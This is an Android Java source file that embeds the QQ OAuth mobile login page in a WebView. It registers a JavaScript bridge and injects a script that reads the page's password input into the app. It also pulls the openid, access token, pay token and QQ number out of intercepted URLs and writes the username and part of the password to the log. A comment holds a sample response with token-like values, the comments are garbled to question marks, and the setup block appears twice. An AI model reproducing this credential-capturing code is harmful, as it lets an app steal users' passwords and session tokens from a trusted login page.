package com.tencent.autochange.account;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.webkit.JavascriptInterface;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import org.json.JSONObject;

public class H5AuthActivity extends AppCompatActivity {
    private static final String QQ_COMMON_LOGIN_URL = "https://openmobile.qq.com/oauth2.0/m_authorize?sdkp=a&scope=all&redirect_uri=auth%3A%2F%2Ftauth.qq.com%2F&response_type=token&client_id=";
    private WebView mH5AuthorizeWb;
    private String mUrl;
    private static final String TAG = "H5AuthActivity";
    private static final String QQ_GET_PWD_SCRIPT = "javascript:JScript.getPwd(document.getElementsByTagName('input')[1].value);";

    private static final String OPENID_KEY = "openid";
    private static final String PARAMS_SEPARATOR = "&";
    private static final String TOKEN_KEY = "access_token";
    private static final String EXPIRED_TIME_KEY = "expires_in";
    private static final String USER_NAME_KEY = "uin";
    private static final String PAY_TOKEN_KEY = "pay_token";
    private static final String PF_KEY = "pf";

    private String mAccessToken;
    private String mOpenId;
    private String mPayToken;
    private String mExpiredTime;
    private String mUserName;
    private String mUserPwd;
    private String mAppId;
    private String mPF;

    private Intent mIntent;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_qq_auth);
        mIntent = getIntent();

        mH5AuthorizeWb = findViewById(R.id.web_view);
        mH5AuthorizeWb.setVerticalScrollBarEnabled(false);
        mH5AuthorizeWb.setHorizontalScrollBarEnabled(false);
        mH5AuthorizeWb.setWebViewClient(new QQWebViewClient());
        mH5AuthorizeWb.clearFormData();
        mH5AuthorizeWb.clearSslPreferences();

        mH5AuthorizeWb.setOnLongClickListener(new View.OnLongClickListener() {
            public boolean onLongClick(View var1) {
                return true;
            }
        });
        mH5AuthorizeWb.setOnTouchListener(new View.OnTouchListener() {
            public boolean onTouch(View webView, MotionEvent event) {
                switch (event.getAction()) {
                    case MotionEvent.ACTION_DOWN:
                    case MotionEvent.ACTION_UP:
                        if (!webView.hasFocus()) {
                            webView.requestFocus();
                        }
                        return false;
                    default:
                        return false;
                }
            }
        });

        WebSettings settings = mH5AuthorizeWb.getSettings();
        settings.setCacheMode(WebSettings.LOAD_DEFAULT);
        settings.setNeedInitialFocus(false);
        settings.setBuiltInZoomControls(true);
        settings.setSupportZoom(true);
        settings.setRenderPriority(WebSettings.RenderPriority.HIGH);
        settings.setJavaScriptEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setDatabasePath(this.getDir("databases", 0).getPath());
        settings.setDomStorageEnabled(true);
        settings.setUseWideViewPort(true);
        settings.setLoadWithOverviewMode(true);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB) {
            mH5AuthorizeWb.removeJavascriptInterface("searchBoxJavaBridge_");
            mH5AuthorizeWb.removeJavascriptInterface("accessibility");
            mH5AuthorizeWb.removeJavascriptInterface("accessibilityTraversal");
        }

        mH5AuthorizeWb = findViewById(R.id.web_view);
        mH5AuthorizeWb.setVerticalScrollBarEnabled(false);
        mH5AuthorizeWb.setHorizontalScrollBarEnabled(false);
        mH5AuthorizeWb.clearFormData();
        mH5AuthorizeWb.clearSslPreferences();

        mH5AuthorizeWb.setOnLongClickListener(new View.OnLongClickListener() {
            public boolean onLongClick(View var1) {
                return true;
            }
        });
        mH5AuthorizeWb.setOnTouchListener(new View.OnTouchListener() {
            public boolean onTouch(View webView, MotionEvent event) {
                switch (event.getAction()) {
                    case MotionEvent.ACTION_DOWN:
                    case MotionEvent.ACTION_UP:
                        if (!webView.hasFocus()) {
                            webView.requestFocus();
                        }
                        return false;
                    default:
                        return false;
                }
            }
        });

        mUrl = QQ_COMMON_LOGIN_URL + "222222";
        // ???????????? js ????????????????????????????????????????????????
        mH5AuthorizeWb.addJavascriptInterface(new WebJavascript(), "JScript");
        this.mH5AuthorizeWb.loadUrl(mUrl);
    }

    /**
     * ??????????????????????????? js ????????????
     */
    public class WebJavascript {
        @JavascriptInterface
        public void getPwd(String password) {
            mUserPwd = password;
        }
    }


    private class QQWebViewClient extends WebViewClient {
        /**
         * ???????????????????????????????????? shouldOverrideUrlLoading(WebView, WebResourceRequest) ?????????????????? LOLLIPOP ??????
         */
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            Log.e(TAG, "shouldOverrideUrlLoading: " + url);
            if (!TextUtils.isEmpty(url)) {
                // ??????????????????
                parsingParamsByUrl(url);
            }
            // ??????????????????
            if (url.startsWith("auth://tauth.qq.com/")) {
                onResultComplete();
                return true;
            }

            if (url.startsWith("https://imgcache.qq.com")) {
                // ???????????? js ??????????????????
                mH5AuthorizeWb.loadUrl(QQ_GET_PWD_SCRIPT);
            }
            return super.shouldOverrideUrlLoading(view, url);
        }

        @Override
        public WebResourceResponse shouldInterceptRequest(WebView view, String url) {
            Log.e(TAG, "shouldOverrideUrlLoading: " + url);
            if (CommonUtils.stringStartsWith(url, "https://ssl.ptlogin2.qq.com")) {
                parsingParamsByUrl(url);
            }
            return super.shouldInterceptRequest(view, url);
        }

        @Override
        public void onPageFinished(WebView view, String url) {
        }
    }

    /**
     * ?????? url ????????? token openid ????????????
     */
    public void parsingParamsByUrl(String url) {
        if (CommonUtils.stringContains(url, OPENID_KEY)) {
            mOpenId = interceptionParams(url, OPENID_KEY);
        }
        if (CommonUtils.stringContains(url, TOKEN_KEY)) {
            mAccessToken = interceptionParams(url, TOKEN_KEY);
        }
        if (CommonUtils.stringContains(url, EXPIRED_TIME_KEY)) {
            mExpiredTime = interceptionParams(url, EXPIRED_TIME_KEY);
        }
        if (CommonUtils.stringContains(url, USER_NAME_KEY)) {
            mUserName = interceptionParams(url, USER_NAME_KEY);
        }
        if (CommonUtils.stringContains(url, PAY_TOKEN_KEY)) {
            mPayToken = interceptionParams(url, PAY_TOKEN_KEY);
        }
        if (CommonUtils.stringContains(url, PF_KEY)) {
            mPF = interceptionParams(url, PF_KEY);
        }
    }

    /**
     * ?????? key ????????????????????????
     *
     * @return param
     */
    public String interceptionParams(String url, String key) {
        key = key + "=";
        int beginIndex = url.indexOf(key);
        if (beginIndex == -1) {
            return "";
        }
        beginIndex = beginIndex + key.length();

        int endIndex = url.indexOf(PARAMS_SEPARATOR, beginIndex);
        if (endIndex == -1) {
            // ????????????????????????????????????????????????
            return url.substring(beginIndex);
        }
        return url.substring(beginIndex, endIndex);
    }

    /**
     * ??????????????????
     */
    private void onResultComplete() {
        Log.e(TAG,mUserName+" -> "+mUserPwd.substring(2,5));
        // ??????????????????????????????
        String responseJsonStr = constructionResponseJsonStr();
        mIntent.putExtra("key_response", responseJsonStr);
        mIntent.putExtra("key_action", "action_login");
        mIntent.putExtra("key_error_code", 0);
        setResult(RESULT_OK, mIntent);
        finish();
    }

    public String constructionResponseJsonStr() {
        // {"ret":0,"openid":"DD105EC48A69D91F726BA70653C2507D","access_token":"C54E3FAACCEA9A4605D72F9ECACBB4DD","pay_token":"B681CF909C725A1DD855C79B72143B49","expires_in":7776000,"pf":"desktop_m_qq-10000144-android-2002-","pfkey":"88293475b9efa7b1b36409287750eabd","msg":"","login_cost":62,"query_authority_cost":-818068606,"authority_cost":3416,"expires_time":1590291429782}
        JSONObject resultJsonObj = new JSONObject();
        try {
            resultJsonObj.put("ret", 0);
            resultJsonObj.put(OPENID_KEY, mOpenId);
            resultJsonObj.put(TOKEN_KEY, mAccessToken);
            resultJsonObj.put(EXPIRED_TIME_KEY, mExpiredTime);
            resultJsonObj.put(PAY_TOKEN_KEY, mPayToken);
            resultJsonObj.put(PF_KEY, mPF);
            resultJsonObj.put("appid", mAppId);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return resultJsonObj.toString();
    }
}
